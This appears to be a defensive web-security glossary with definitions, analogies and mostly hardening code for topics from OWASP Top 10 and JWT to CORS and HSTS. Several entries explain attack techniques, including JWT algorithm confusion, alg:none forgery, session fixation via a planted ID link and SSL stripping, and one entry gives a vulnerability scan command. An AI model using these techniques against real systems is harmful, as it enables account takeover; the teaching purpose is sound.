words.shortDefinition: OWASP's ranked list of the ten most critical web application security risk categories, updated every few years.
words.simpleDefinition: The OWASP Top 10 is a ranked awareness document published by the Open Worldwide Application Security Project. It lists the ten most dangerous patterns attackers currently exploit across web applications, drawing on data from hundreds of organizations and millions of tested applications. The 2021 edition — the current authoritative version — is led by Broken Access Control, followed by Cryptographic Failures and Injection.
words.longDefinition: The OWASP Top 10 is the most-cited document in application security. It combines two inputs: empirical data from hundreds of contributing organizations covering millions of tested applications, and a community survey where practitioners rate emerging risks. Each category is scored on likelihood (prevalence, detectability, exploitability) multiplied by impact (technical and business consequences). The ranking shifts between editions as defensive practices improve — SQL Injection led the list for over a decade before dropping to third place in 2021 as parameterized query libraries became standard. The 2021 edition introduced three new categories: Insecure Design (A04), Software and Data Integrity Failures (A08), and SSRF (A10). Critically, the Top 10 is a risk-awareness document, not a compliance checklist — passing all ten categories does not make an application secure, it means the application avoids the ten most common failure patterns. OWASP maintains companion resources: the ASVS for structured verification, the WSTG for testing methodology, and the API Security Top 10 for REST/GraphQL-specific risks.
words.connector: Think of the OWASP Top 10 like a 'most-wanted' list for web application crimes — it tells defenders where the worst offenders cluster, not every possible offense.
words.techContext: Our quarterly security review maps every open finding to an OWASP Top 10 category so we can measure whether our control investments are hitting the highest-risk areas.
words.exampleSentence: When the new engineer asked where to start with web security, the tech lead pointed them to the OWASP Top 10 to understand the landscape before diving into any individual vulnerability.

codeExample.code:
# Run OWASP ZAP baseline scan against a target
# Maps findings to OWASP Top 10 categories automatically
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://app.example.com \
  -r zap-report.html

# Output groups findings by category:
# [A01] Broken Access Control  — 3 alerts
# [A05] Security Misconfiguration — 7 alerts
# [A03] Injection               — 1 alert

words.etymology: OWASP stands for Open Worldwide Application Security Project (originally 'Open Web Application Security Project', updated 2023). The organization was founded in 2001; the Top 10 list has been published since 2003.

words.shortDefinition: Consolidated OAuth 2 specification that mandates PKCE, removes implicit flow, and tightens redirect-URI validation.
words.simpleDefinition: OAuth 2.1 is not a new protocol — it is a cleaned-up consolidation of OAuth 2.0 and all the security best practices (BCP 212 / RFC 9700) that accumulated over a decade of real-world use. The implicit flow, which returned tokens directly in browser URL fragments and caused widespread token leakage, is gone. PKCE is now mandatory for all clients including confidential server-side apps. Redirect URI matching must be exact, not prefix-based.
words.longDefinition: OAuth 2.0 (RFC 6749) was published in 2012. Over the following decade, several flows it defined turned out to be insecure, and a library of additional RFCs and best-current-practice documents accumulated. OAuth 2.1 (draft RFC) consolidates the result: it incorporates RFC 6749, RFC 6750 (Bearer tokens), RFC 7636 (PKCE), RFC 8707 (Resource Indicators), and OAuth 2.0 Security BCP (RFC 9700) into a single coherent document. Key changes: the Implicit flow (response_type=token) is removed; the Resource Owner Password Credentials (ROPC) flow is removed; PKCE is required for all authorization code flows regardless of client type; refresh tokens issued to public clients must be sender-constrained or rotate with each use; redirect URI matching must be an exact string comparison, not a prefix or pattern match. The consolidation matters because older OAuth 2.0 deployments that still use implicit flow or loose redirect URI matching are vulnerable to authorization code interception and token theft.
words.connector: Think of OAuth 2.1 as a security-focused update removing the unsafe shortcuts from the original spec — like a revised driver's-ed manual that removes the chapter saying it's sometimes okay to skip checking your mirrors.
words.techContext: We upgraded our authorization server to OAuth 2.1 mode, which required adding PKCE to our mobile app flows and switching the SPA from implicit to authorization code with PKCE.
words.exampleSentence: The security audit flagged our SPA for using the implicit flow, so we migrated to the authorization code flow with PKCE as required by OAuth 2.1.
words.etymology: OAuth derives from 'Open Authorization'; the 2.1 designation reflects a consolidating minor revision rather than a protocol redesign.

words.shortDefinition: OpenID Connect; identity layer on top of OAuth 2 that provides a standardized ID token for user authentication.
words.simpleDefinition: OAuth 2 solves authorization — it lets an app act on a user's behalf. But it says nothing about who the user is. OpenID Connect (OIDC) fills that gap by adding an ID token: a signed JWT containing the user's identity claims (sub, email, name). The app can verify the ID token's signature and trust the identity without building its own authentication protocol.
words.longDefinition: OpenID Connect 1.0 was published in 2014 by the OpenID Foundation. It sits as an identity layer on top of OAuth 2.0, adding three things: a standardized ID token (a signed JWT), a UserInfo endpoint the app can query for additional claims, and a Discovery document (/.well-known/openid-configuration) that describes the provider's endpoints and supported algorithms. The ID token contains: iss (issuer), sub (subject — stable unique user ID), aud (audience — must match your client_id), exp (expiry), iat (issued-at), and optionally nonce (for replay protection). Critical validation rules: verify the signature using the provider's public key (obtained from the JWKS endpoint), verify iss matches the expected provider, verify aud contains your client_id, verify exp is in the future, verify nonce matches what you sent (for implicit/hybrid flows). OIDC underpins nearly every modern SSO system — Google Sign-In, Apple Sign-In, GitHub OAuth, Okta, Auth0, and Cognito all implement OIDC. The separation of concerns is key: OAuth 2 handles 'can this app access resource X?'; OIDC handles 'who is this user?'
words.connector: Think of OIDC as the identity card layer on top of OAuth's access-permit layer — OAuth says 'you may enter', OIDC says 'and here is who you are'.
words.techContext: We use OIDC with our identity provider so the app receives a verified ID token on login — no password storage, no custom auth code, just signature verification.
words.exampleSentence: By integrating OIDC, the platform could verify the user's identity from any compliant provider without ever storing passwords or implementing its own authentication logic.
words.etymology: OpenID Connect combines 'OpenID' (the older federated identity standard, 2005) with 'Connect' to signal its role as the connector between OAuth 2 authorization and user identity.

words.shortDefinition: JSON Web Token; a compact, self-contained token encoding claims and a cryptographic signature.
words.simpleDefinition: A JWT is three base64url-encoded JSON objects joined by dots: a header (algorithm), a payload (claims like user ID, roles, expiry), and a signature. The server signs the token at issuance; any server that knows the key can verify it without a database lookup. That statelessness is the main advantage — and the source of several dangerous pitfalls.
words.longDefinition: JSON Web Tokens (RFC 7519) are the dominant token format for modern web APIs and OIDC ID tokens. Structure: header.payload.signature, all base64url-encoded. The header specifies the algorithm (e.g., RS256, HS256, ES256). The payload carries registered claims (iss, sub, aud, exp, iat, jti) and application-specific claims. The signature covers header + payload. Critical security issues: (1) algorithm confusion — if the server accepts the alg field from the token itself rather than enforcing an expected algorithm, attackers can switch from RS256 to HS256 and sign with the server's public key as the HMAC secret; (2) none algorithm — some early libraries accepted alg:none, allowing unsigned tokens; (3) weak or shared secrets — HS256 tokens signed with a guessable secret can be brute-forced offline; (4) missing expiry — JWTs without exp cannot be revoked and remain valid indefinitely; (5) storing sensitive data in claims — the payload is only base64-encoded, not encrypted; anyone with the token can decode it. Mitigation: always enforce a specific algorithm allowlist server-side; validate iss, aud, exp, and iat on every request; use short expiry times with refresh tokens; store JWTs in HttpOnly cookies, not localStorage.
words.connector: Think of a JWT like a signed check — anyone can read what it says, but only someone with the right key can produce a valid signature, so the payee can verify it without calling the bank.
words.techContext: Our API validates JWTs on every request, enforcing RS256 signatures verified against our identity provider's published JWKS endpoint rather than a shared secret.
words.exampleSentence: The penetration test found the JWT library accepted alg:none, allowing the tester to forge tokens for any user by removing the signature field entirely.

codeExample.code:
import jwt  # PyJWT

# Secure: enforce algorithm allowlist, validate all claims
try:
    payload = jwt.decode(
        token,
        public_key,                    # RS256 public key
        algorithms=["RS256"],           # never pass algorithms from the token header
        audience="api.example.com",
        issuer="https://auth.example.com",
        options={"require": ["exp", "iat", "sub"]},
    )
except jwt.ExpiredSignatureError:
    raise Unauthorized("Token expired")
except jwt.InvalidTokenError as e:
    raise Unauthorized(str(e))

words.etymology: JWT stands for JSON Web Token; the JSON Web family (RFC 7515-7520) also includes JWS (Signature), JWE (Encryption), JWK (Key), and JWA (Algorithms).

words.shortDefinition: Multi-Factor Authentication; requires at least two distinct factors (knowledge, possession, inherence) to authenticate.
words.simpleDefinition: MFA requires a user to prove identity using at least two separate factor types: something you know (password), something you possess (phone, hardware key), or something you are (biometric). The value is that stealing one factor — a password from a breach database — is not enough. An attacker also needs the second factor, which is typically bound to a physical device the user controls.
words.longDefinition: Multi-Factor Authentication (MFA) is the single highest-impact control for preventing account takeover. CISA data consistently shows that MFA blocks over 99% of automated credential-stuffing attacks and 95% of targeted phishing attacks (phishing-resistant FIDO2 blocks essentially all). The three factor categories: knowledge (password, PIN, security question), possession (TOTP app, SMS OTP, push notification, hardware security key), inherence (fingerprint, face scan, behavioral biometrics). Not all MFA is equal: SMS OTP is vulnerable to SIM-swapping; TOTP apps are vulnerable to real-time phishing (an attacker proxy relays the OTP before it expires); FIDO2/WebAuthn hardware keys are phishing-resistant because the cryptographic response is bound to the origin. Uber's 2022 breach illustrates MFA fatigue: the attacker sent repeated push auth requests until the target approved one, bypassing TOTP-based MFA entirely. The NIST SP 800-63B guidance designates phishing-resistant authenticators (hardware security keys, passkeys) as the gold standard. For most consumer applications, TOTP apps (Authenticator apps) are a practical middle ground that dramatically reduces risk even if not phishing-resistant.
words.connector: Think of MFA like a safe-deposit box — the bank needs both your key and their key to open it. Stealing one key is useless without the other.
words.techContext: After enabling MFA for all admin accounts, our account takeover incidents dropped to zero; previous incidents had all used valid credentials obtained via credential stuffing.
words.exampleSentence: The compliance audit required MFA for all privileged accounts, so the engineering team integrated TOTP support using an RFC 6238-compliant library.

codeExample.code:
import pyotp
import qrcode

# Generate a TOTP secret for a new user
secret = pyotp.random_base32()

# Create provisioning URI for QR code (shown once during enrollment)
totp = pyotp.TOTP(secret)
uri = totp.provisioning_uri(name='alice@example.com', issuer_name='MyApp')
qrcode.make(uri).save('enroll-qr.png')

# Verify at login: window=1 allows ±30 sec clock drift
def verify_totp(secret: str, user_code: str) -> bool:
    return pyotp.TOTP(secret).verify(user_code, valid_window=1)

words.etymology: Multi-Factor Authentication formalizes the 'something you know / have / are' framework that traces back to banking security protocols of the 1980s; NIST's SP 800-63 series codified the three-factor taxonomy.

words.shortDefinition: FIDO2/WebAuthn credentials stored on a device; replace passwords with public-key cryptography for phishing-resistant login.
words.simpleDefinition: Passkeys are FIDO2 credentials backed by the WebAuthn standard. When you create a passkey, your device generates a public-private key pair. The public key is registered with the server; the private key never leaves the device. To authenticate, the server sends a challenge; the device signs it with the private key (unlocked by biometric or PIN). There is no password to phish, stuff, or breach.
words.longDefinition: Passkeys are the consumer-facing brand name for FIDO2 discoverable credentials, introduced in 2022 by the FIDO Alliance with support from Apple, Google, and Microsoft. They are built on the WebAuthn (W3C) and CTAP2 (FIDO) specifications. The key properties: (1) no shared secret — the server only ever stores a public key; a breach of the credentials database yields nothing useful; (2) phishing-resistant — the WebAuthn ceremony cryptographically binds the assertion to the origin (rpId), so an attacker cannot relay credentials from a lookalike domain; (3) multi-device sync — passkeys can sync across devices via platform keystores (iCloud Keychain, Google Password Manager), unlike hardware security keys; (4) biometric local unlock — the private key is unlocked by device biometric or PIN, satisfying both possession and inherence factors simultaneously. From the server's perspective, the flow is: registration (store public key + credential ID), then authentication (send random challenge, verify signed response). Compared with TOTP, passkeys eliminate the phishing window entirely — TOTP codes can be relayed by a real-time proxy, but a WebAuthn response bound to the wrong origin fails server-side validation. NIST SP 800-63B (2024 update) classifies FIDO2 authenticators as AAL3-capable, the highest assurance level.
words.connector: Think of a passkey like a house key that your device generates and never lets leave your pocket — the lock only knows the shape of your key's lock mechanism (public key), not the key itself.
words.techContext: We added passkey support using the WebAuthn browser API; users who register a passkey can log in with just a fingerprint scan — no password field, no OTP prompt.
words.exampleSentence: After the phishing simulation showed 20% of employees entering credentials on a lookalike site, the security team prioritized passkey rollout because passkeys are cryptographically bound to the real origin.
words.etymology: Passkey was introduced as a consumer-friendly term by the FIDO Alliance in 2022 to describe multi-device FIDO2 credentials; the underlying WebAuthn specification dates to the W3C Recommendation of 2019.

words.shortDefinition: Content Security Policy; HTTP header that restricts which scripts, styles, and resources a page may load.
words.simpleDefinition: CSP is a browser security mechanism activated by an HTTP response header. It tells the browser a whitelist of sources from which the page may load scripts, styles, images, fonts, and other resources. When a script tag or eval() call violates the policy, the browser blocks execution. CSP does not prevent XSS bugs in your code; it limits what an attacker can do if they manage to inject markup.
words.longDefinition: Content Security Policy (CSP) is defined in the W3C CSP Level 3 specification and delivered via the Content-Security-Policy response header (or a <meta> tag, though the header form is preferred). The policy is a semicolon-separated list of directives. Key directives: default-src (fallback for all resource types), script-src (controls script sources; includes 'self', specific domains, 'nonce-{random}', 'strict-dynamic'), style-src, img-src, connect-src (XHR/fetch), frame-ancestors (replaces X-Frame-Options), upgrade-insecure-requests. The modern best-practice policy avoids source allowlists in favor of nonces: every <script> tag must carry a per-request cryptographic nonce matching the CSP header. An injected <script> tag without the nonce is blocked, even if loaded from an allowed origin. 'strict-dynamic' allows nonce-trusted scripts to load their own dependencies, enabling SPAs. Pitfalls: unsafe-inline bypasses almost all script protection (do not use it except in CSP Level 2 fallback); unsafe-eval is required by some older libraries; a single * wildcard in script-src defeats the policy. Use report-uri or report-to to collect policy violations in monitoring before switching from Content-Security-Policy-Report-Only to enforcement mode.
words.connector: Think of CSP like an airport security checkpoint — your page explicitly pre-approves which scripts may board. Anything that shows up without clearance is turned away at the gate.
words.techContext: We deployed a nonce-based CSP in report-only mode for two weeks, fixed the violations, then enabled enforcement — XSS payloads in our comment fields now produce console errors instead of executing.
words.exampleSentence: The penetration test confirmed that although a stored XSS payload existed in the profile bio field, the strict nonce-based CSP prevented the injected script from executing in any tested browser.

codeExample.code:
import secrets
from flask import Flask, g, make_response

app = Flask(__name__)

@app.before_request
def generate_nonce():
    g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def add_csp_header(response):
    nonce = g.csp_nonce
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'nonce-{nonce}' 'strict-dynamic'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"object-src 'none'; "
        f"base-uri 'none';"
    )
    return response

words.etymology: Content Security Policy emerged from browser vendor discussions around 2009-2010 to address the limitations of output encoding alone; Mozilla shipped the first implementation in Firefox 4 (2011).

words.shortDefinition: Cookie attribute controlling whether the browser sends a cookie on cross-site requests, mitigating CSRF.
words.simpleDefinition: The SameSite attribute tells the browser when to include a cookie on cross-site requests. Strict means never on cross-site navigation. Lax (the Chrome default since 2020) means only on top-level GET navigations — no cross-site POST, iframe, or fetch. None means send always (pre-2020 behavior), but requires Secure. Lax blocks the most dangerous CSRF vectors, but Strict provides the strongest protection at the cost of some UX friction.
words.longDefinition: SameSite was introduced as a draft RFC by Google engineers in 2016 and added to the HTTP Cookie specification (RFC 6265bis). It exploits the distinction between same-site and cross-site requests: a request is same-site if the top-level document origin and the resource origin share the same registrable domain (eTLD+1); otherwise it is cross-site. Three values: SameSite=Strict — cookie never sent on cross-site requests, including top-level navigations from other sites (breaks SSO-style 'continue where you left off' flows); SameSite=Lax — cookie sent only on same-site requests and on cross-site top-level navigations with safe HTTP methods (GET, HEAD); SameSite=None — cookie sent in all contexts, backward-compatible, requires the Secure flag. Chrome changed the default from None to Lax in 2020 (SameSite-by-default), which broke many CSRF-vulnerable apps by accident. Limitations: SameSite does not replace CSRF tokens entirely — a subdomain takeover or a same-site but cross-origin attack path can still bypass it; Lax allows cross-site GET, so state-changing GET endpoints remain vulnerable. The defense-in-depth approach: use SameSite=Lax (or Strict where UX allows) plus a CSRF token for sensitive state-changing operations.
words.connector: Think of SameSite like a party guest rule: Strict says your browser only brings cookies to parties hosted by the same family (site), while Lax says it can bring cookies when walking in the door but not while quietly slipping in through a side window.
words.techContext: After Chrome's SameSite-by-default rollout our legacy API's cross-site POST integrations stopped receiving session cookies, forcing us to audit every cross-site flow.
words.exampleSentence: Setting SameSite=Strict on our session cookie eliminated most CSRF vectors, but we kept CSRF tokens for the payment endpoints as an additional layer since SameSite alone cannot block same-site subdomain attacks.

codeExample.code:
# Flask-style secure session cookie configuration
app.config.update(
    SESSION_COOKIE_SECURE=True,        # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,      # no JS access
    SESSION_COOKIE_SAMESITE='Lax',     # block cross-site POST/iframe
    SESSION_COOKIE_NAME='__Host-sid',  # __Host- prefix: forces Secure + path=/
    PERMANENT_SESSION_LIFETIME=3600,   # 1-hour idle timeout
)

words.etymology: SameSite was coined by the Chrome security team to contrast with 'cross-site'; it leverages the 'site' definition from the URL Standard (eTLD+1), which is broader than 'origin' (scheme+host+port).

words.shortDefinition: Cross-Origin Resource Sharing; browser mechanism allowing servers to selectively relax the same-origin policy.
words.simpleDefinition: The Same-Origin Policy (SOP) blocks browser scripts from reading responses from a different origin. CORS is the controlled escape hatch: a server includes Access-Control-Allow-Origin in its response to tell the browser which origins may read it. For requests with credentials or non-simple methods, the browser sends a preflight OPTIONS request first. CORS is enforced by the browser, not the server — and server-side CORS misconfiguration is one of the most common web security vulnerabilities.
words.longDefinition: CORS is defined in the Fetch Living Standard and the CORS specification. The browser enforces two layers of control: (1) Simple requests (GET/HEAD/POST with safe content types) are sent directly; the browser checks the response's Access-Control-Allow-Origin header before allowing the calling script to read the response. (2) Preflighted requests (DELETE, PUT, PATCH, or any POST with a non-simple content type, or custom headers) trigger an OPTIONS preflight; the server must respond with Access-Control-Allow-Methods, Access-Control-Allow-Headers, and optionally Access-Control-Allow-Credentials before the real request is sent. Critical misconfiguration patterns: reflecting the Origin header verbatim (Access-Control-Allow-Origin: [request origin] + Access-Control-Allow-Credentials: true) — any origin can read credentialed responses; using null as the origin whitelist — file:// and sandboxed iframes send Origin: null; trusting subdomains loosely (*.example.com includes compromised subdomains). CORS does not protect against CSRF — SOP blocks reads, not writes. A malicious page can still trigger state-changing requests; only the response is blocked. The fix for CORS misconfigurations: maintain an explicit allowlist of trusted origins, never reflect the request Origin directly, and never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true (browsers block this combination, but some proxies do not).
words.connector: Think of CORS like a bouncer with a guest list: the Same-Origin Policy says nobody crosses the rope; CORS lets the server hand the bouncer an approved list of origins that can read its responses.
words.techContext: Our API had a CORS misconfiguration that reflected any request origin with credentials allowed, which the penetration tester exploited to read authenticated API responses from a cross-origin page.
words.exampleSentence: The security scan flagged the CORS policy for allowing any origin with credentials, so we replaced the wildcard reflection with an explicit allowlist of known front-end origins.

codeExample.code:
from flask_cors import CORS

ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://admin.example.com',
]

# Explicit allowlist — never reflect request Origin directly
CORS(
    app,
    origins=ALLOWED_ORIGINS,
    supports_credentials=True,    # required for cookies/auth headers
    methods=['GET', 'POST', 'PUT', 'DELETE'],
    allow_headers=['Content-Type', 'Authorization'],
)

words.etymology: Cross-Origin Resource Sharing was introduced by the W3C in 2009 as the standardized replacement for ad hoc techniques like JSONP; the term 'origin' derives from the same-origin policy introduced by Netscape in 1995.

words.shortDefinition: Memory-hard password hashing algorithm; winner of the 2015 Password Hashing Competition and OWASP's first recommendation.
words.simpleDefinition: Argon2 makes password cracking expensive not just in CPU time but in memory. An attacker trying to brute-force passwords in parallel needs a large amount of RAM per attempt, which dramatically limits how many hashes per second a GPU cluster can compute. OWASP recommends Argon2id (the hybrid variant) as the first choice for new systems.
words.longDefinition: Argon2 was designed by Alex Biryukov, Daniel Dinu, and Dmitry Khovratovich at the University of Luxembourg and won the Password Hashing Competition (PHC) in 2015. It comes in three variants: Argon2d (maximizes GPU resistance using data-dependent memory access), Argon2i (side-channel resistant using data-independent access), and Argon2id (hybrid: data-independent in the first pass, data-dependent thereafter — combines the strengths of both). Argon2id is the OWASP-recommended variant. Three tunable parameters: m (memory cost in KB), t (time cost — number of iterations), p (parallelism — number of threads). OWASP's minimum recommended configuration: m=47104 (46 MB), t=1, p=1. The memory requirement is the key differentiator — SHA-256 can compute ~10 billion hashes/sec on a modern GPU; Argon2id at 46 MB can compute fewer than 1,000 hashes/sec on the same hardware because memory bandwidth is the bottleneck. Argon2 is registered as RFC 9106 (2021), giving it formal IETF standing. Most languages have mature libraries: libsodium, argon2-cffi (Python), node-argon2 (Node.js).
words.connector: Think of Argon2 like a vault that requires both a combination (CPU work) and a large team to carry the contents (memory) — GPU farms can bring unlimited CPU but memory per thread is a fixed hardware constraint.
words.techContext: We migrated from bcrypt to Argon2id on user login, transparently re-hashing passwords at next authentication using a configurable memory cost that we tune annually as hardware costs drop.
words.exampleSentence: The security team chose Argon2id for the new credential store because its memory-hardness makes GPU-based offline cracking impractical even if the hash database is compromised.
words.etymology: Named after argon, the noble gas, following the convention of the Password Hashing Competition; the number 2 distinguishes it from the original Argon submission.

words.shortDefinition: Adaptive password hashing function with a tunable work factor; widely supported, but has a 72-byte input limit.
words.simpleDefinition: bcrypt is a password hashing function designed in 1999 that includes a cost parameter — higher cost means more iterations and a slower hash. The work factor can be increased over time as hardware improves without invalidating existing hashes. Its main limitation: inputs longer than 72 bytes are silently truncated, so very long passphrases have less entropy than they appear to.
words.longDefinition: bcrypt was designed by Niels Provos and David Mazières, published at USENIX 1999. It is based on the Blowfish cipher's key schedule, using an Expensive Key Setup (EKS) algorithm that makes each hash computation require a configurable number of rounds (2^cost). The cost parameter (typically 10-14) is embedded in the hash output, so the work factor can be increased for new hashes while old hashes remain verifiable. The output format ($2b$12$...) encodes version, cost, salt (22 chars), and hash (31 chars). The 72-byte truncation limit is the most consequential footgun: a password of 200 characters and one of 72 characters with the same first 72 bytes produce identical hashes. This makes passphrase-based approaches less secure than they appear. OWASP's current guidance recommends Argon2id as the first choice for new systems, with bcrypt as an acceptable alternative for existing systems. Minimum recommended cost factor: 10 (verified takes ~100ms on modern hardware), tuned annually. Unlike Argon2, bcrypt has no memory cost — it is purely CPU-bound, which means well-resourced GPU attacks are more efficient against bcrypt than against Argon2id.
words.connector: Think of bcrypt like an adjustable safe dial — you can increase the number of turns required as safecrackers get faster, keeping the opening time constant at about one second regardless of hardware generation.
words.techContext: Our legacy auth service still uses bcrypt at cost 12; we verify that hashing new passwords takes approximately 100ms on our application servers and increase the cost factor annually.
words.exampleSentence: The code review flagged that the registration endpoint accepted passwords up to 500 characters, but bcrypt silently truncates at 72 bytes, making the extra length illusory.
words.etymology: bcrypt combines 'b' from Blowfish (the cipher it is based on) with 'crypt', the Unix password hashing convention; designed by Niels Provos and David Mazières, published at USENIX 1999.

words.shortDefinition: Proof Key for Code Exchange; OAuth extension that prevents authorization-code interception attacks in public clients.
words.simpleDefinition: PKCE solves the authorization code interception attack: a malicious app on the same device intercepts the OAuth redirect URI and steals the authorization code. With PKCE, the legitimate client generates a random secret (code_verifier) and sends its hash (code_challenge) at the start of the flow. Only the client that knows the original verifier can exchange the code for tokens — making the stolen code useless to an interceptor.
words.longDefinition: PKCE (RFC 7636, 2015) was originally designed for mobile and native applications where client secrets cannot be stored securely. On a mobile device, multiple apps can register as a handler for the same URI scheme; a malicious app can intercept the OAuth redirect and steal the authorization code. PKCE prevents this: the client generates a high-entropy code_verifier (43-128 random characters), computes code_challenge = BASE64URL(SHA256(code_verifier)), and sends the challenge with the authorization request. When exchanging the code for tokens, the client sends the original code_verifier; the authorization server hashes it and compares to the stored challenge. Without the verifier, a stolen code cannot be exchanged. OAuth 2.1 mandates PKCE for all clients including confidential server-side applications (where it prevents authorization code injection attacks even if the client secret is known). S256 is the only code_challenge_method that should be used in practice; plain (no hash) provides no security and is prohibited by OAuth 2.1.
words.connector: Think of PKCE like a coat check: you hand in a locked ticket (code_challenge) when you arrive, and only someone with the matching key (code_verifier) can pick up the coat — even if someone else copies your ticket number.
words.techContext: Our authorization server enables PKCE by default and rejects authorization requests without a code_challenge, which OAuth 2.1 requires even for server-side confidential clients.
words.exampleSentence: The mobile security audit found the iOS app was not using PKCE, leaving it vulnerable to a malicious app intercepting the OAuth redirect and stealing authorization codes.
words.etymology: Proof Key for Code Exchange was coined by the RFC 7636 authors to describe the mechanism: a 'proof key' that must be presented to 'exchange' the authorization 'code' for tokens.

words.shortDefinition: Long-lived credential used to obtain new access tokens without re-authentication; must be stored and rotated securely.
words.simpleDefinition: Access tokens are short-lived (minutes) to limit damage if stolen. Refresh tokens are longer-lived (hours to days) and used to silently obtain new access tokens when the current one expires. If a refresh token is stolen, an attacker can maintain persistent access. Refresh token rotation — issuing a new refresh token on each use and invalidating the old one — limits the window of exploitation.
words.longDefinition: The access token / refresh token split is the OAuth 2.0 solution to a fundamental tension: short-lived tokens limit damage from theft but require frequent re-authentication; long-lived tokens are convenient but catastrophic if stolen. Refresh tokens live at the authorization server; access tokens are sent to resource servers on every request. Security requirements for refresh tokens: (1) store in HttpOnly Secure cookies (not localStorage, which is accessible to any same-origin XSS); (2) implement refresh token rotation — each use of a refresh token issues a new one and invalidates the old one; (3) implement refresh token reuse detection — if an already-used token is presented, revoke the entire token family (indicating compromise); (4) bind to client identity where possible (sender-constrained tokens using DPoP or mTLS). RFC 6819 (OAuth 2.0 Threat Model) and the OAuth 2.0 Security BCP (RFC 9700) provide detailed guidance on refresh token handling. Public clients (SPAs, mobile apps) require rotation; confidential clients (server-side apps) should also rotate for defense in depth. Token family invalidation on reuse detection is formalized in RFC 6749 §10.4 and the Security BCP.
words.connector: Think of a refresh token like a renewable visitor badge — your day pass (access token) expires every hour, but you show your renewable credential at the desk to get a fresh one without going through the full ID check again.
words.techContext: Our authorization server implements refresh token rotation with reuse detection: presenting a previously used token invalidates all active tokens in that family and triggers a security alert.
words.exampleSentence: The security review found refresh tokens stored in localStorage; we migrated them to HttpOnly cookies and added rotation, so a stolen token is useful for at most one use before it is invalidated.
words.etymology: Refresh token terminology originates in OAuth 2.0 (RFC 6749, 2012); the word 'refresh' reflects its purpose — renewing an expired access token rather than re-prompting the user.

words.shortDefinition: Attacker supplies a known session ID pre-login; if the server doesn't rotate it on auth, the attacker hijacks the session.
words.simpleDefinition: In a session fixation attack, the attacker tricks the victim into starting a session with a session ID the attacker already knows — for example, via a URL parameter or a crafted cookie. If the server uses the same session ID after the user logs in without generating a new one, the attacker's pre-known ID becomes a valid authenticated session. The fix is always generating a new, random session ID immediately upon successful authentication.
words.longDefinition: Session fixation was documented by Mitja Kolsek in 2002. The attack flow: (1) attacker obtains a valid unauthenticated session ID from the target server (either by visiting it or by knowing the server accepts externally supplied IDs); (2) attacker sends victim a link containing the session ID (e.g., https://example.com/login?sessionid=ATTACKER_KNOWN_ID); (3) victim clicks the link, logs in, and the server associates the attacker-chosen session ID with the authenticated session; (4) attacker uses the known session ID to access the authenticated session. The root cause is session ID reuse across the authentication boundary. The fix is unconditional: call session_regenerate_id() (or equivalent) immediately after successful authentication, before any privileged actions. Also: do not accept session IDs from URL parameters; session IDs must only travel in cookies with HttpOnly and Secure flags. The OWASP Session Management Cheat Sheet mandates session ID rotation on login, privilege level change, and logout. This is distinct from session hijacking (stealing an existing session ID) — fixation uses a pre-planted ID rather than stealing one post-authentication.
words.connector: Think of session fixation like a locksmith handing you a key they already copied before you even move in — once the lock is installed (login), they can enter because they already had the key.
words.techContext: Our session middleware automatically calls regenerateId() on every successful login, making session fixation attacks impossible regardless of how the pre-auth session was established.
words.exampleSentence: The penetration test demonstrated a session fixation vulnerability: the app accepted a sessionId URL parameter and failed to rotate it on login, allowing the tester to hijack authenticated sessions.

codeExample.code:
# Flask: regenerate session on login to prevent session fixation
from flask import session, request, redirect
from flask_login import login_user

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if not user:
        return render_template('login.html', error='Invalid credentials'), 401

    # Critical: clear the old session and generate a new session ID
    # before storing any authenticated state
    session.clear()          # removes all session data
    login_user(user)         # sets new authenticated session
    # Flask's session uses a signed cookie; clearing creates a new value
    return redirect('/dashboard')

words.etymology: Session fixation names the attack technique: the attacker 'fixes' (pins) the session identifier to a value they know in advance, before authentication occurs.

words.shortDefinition: HTTP Strict Transport Security; tells browsers to always use HTTPS for a domain, preventing protocol downgrade attacks.
words.simpleDefinition: HSTS is an HTTP response header that instructs the browser to never load the site over plain HTTP for a specified duration. Once a browser sees the HSTS header, all future connections to that domain are automatically upgraded to HTTPS before any request is sent — even if the user types 'http://' or clicks an http:// link. This prevents SSL-stripping attacks.
words.longDefinition: HTTP Strict Transport Security (RFC 6797) was introduced in 2012. The header format: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. max-age specifies the duration in seconds (one year is standard). includeSubDomains applies the policy to all subdomains — critical for preventing cookie theft via http:// subdomain requests. preload submits the domain to browser-maintained HSTS preload lists (hstspreload.org), providing protection even for first-time visitors who have never seen the header (the 'TOFU' — trust on first use — window is eliminated). SSL stripping attack: a network attacker downgrades the connection from HTTPS to HTTP (by intercepting the initial HTTP request before the redirect to HTTPS), then relays between the victim over HTTP and the server over HTTPS. HSTS prevents this because the browser refuses to send any HTTP request to the domain once the policy is cached. Important: HSTS only activates after the first HTTPS response containing the header — a user who has never visited the site is still vulnerable to SSL stripping on the first connection, which is why preloading matters for high-value sites. Removing HSTS requires serving a max-age=0 header and waiting for the cached policy to expire.
words.connector: Think of HSTS like a signed contract between the browser and the server: 'For the next year, I will only knock on your HTTPS door — even if someone tries to redirect me to the HTTP door first.'
words.techContext: We added HSTS with a one-year max-age and includeSubDomains before submitting to the preload list, eliminating the SSL-stripping risk on first visit for all new users.
words.exampleSentence: The security audit found the HSTS header had no includeSubDomains directive, meaning an attacker could serve cookies over HTTP on a subdomain and steal them across the main domain.
words.etymology: HTTP Strict Transport Security was proposed by Collin Jackson and Adam Barth in 2009 and standardized as RFC 6797 in 2012; 'strict' indicates the browser enforces the upgrade unconditionally.

words.shortDefinition: HTTP response header that prevents a page from being embedded in an iframe, defending against clickjacking.
words.simpleDefinition: X-Frame-Options tells the browser whether the page may be embedded inside an iframe or frame on another site. DENY forbids framing entirely. SAMEORIGIN allows framing only by the same origin. This prevents clickjacking attacks, where an attacker overlays an invisible iframe of the victim site over a convincing decoy to trick users into clicking on hidden buttons.
